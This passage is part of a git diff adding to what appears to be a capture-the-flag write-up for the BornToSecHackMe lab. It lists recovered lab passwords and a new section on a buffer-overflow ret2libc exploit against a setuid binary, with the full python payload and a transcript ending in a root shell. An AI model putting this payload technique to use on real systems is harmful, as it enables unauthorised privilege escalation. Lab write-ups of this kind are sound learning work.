@@ -219,3 +219,19 @@ password : Publicspeakingisveryeasy.126241207201b2149opekmq426135
 - So with the help of our good friend chatGPT we made a python script to draw the turtle's trajectory from the instruction file (check in resources folder), and saw the letters "SLASH" appear on the screen.
 
 - At the end of the file, there's a hint saying `Can you digest the message? :)` which made us understand that we had to give the string "SLASH" to MD5 (Message Digest 5) hashing algo. Here' zaz password : `646da671ca01bb5d84dbb5fb2238dc8e`
+
+## - Zaz's exploit challenge
+
+- Here there's a binary executable called `exploit_me`, executable with root privileges, which calls strcpy on a buffer, copying argv[1] into it. We know this is a breach we can exploit to overflow the buffer and use a ret2libc technique. We tried to give the program this input : `./exploit_me $(python -c"print 'A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'ABCD' + '\xb7\xf8\xcc\x58'[::-1]")` 
+
+- `0xb7e6b060` is the address of the `system()` function
+- `0xB7F8CC58` is the address of the string `"/bin/sh"`
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c"print 'A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'ABCD' + '\xb7\xf8\xcc\x58'[::-1]")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��ABCDX���
+# whoami
+root
+```
+
+
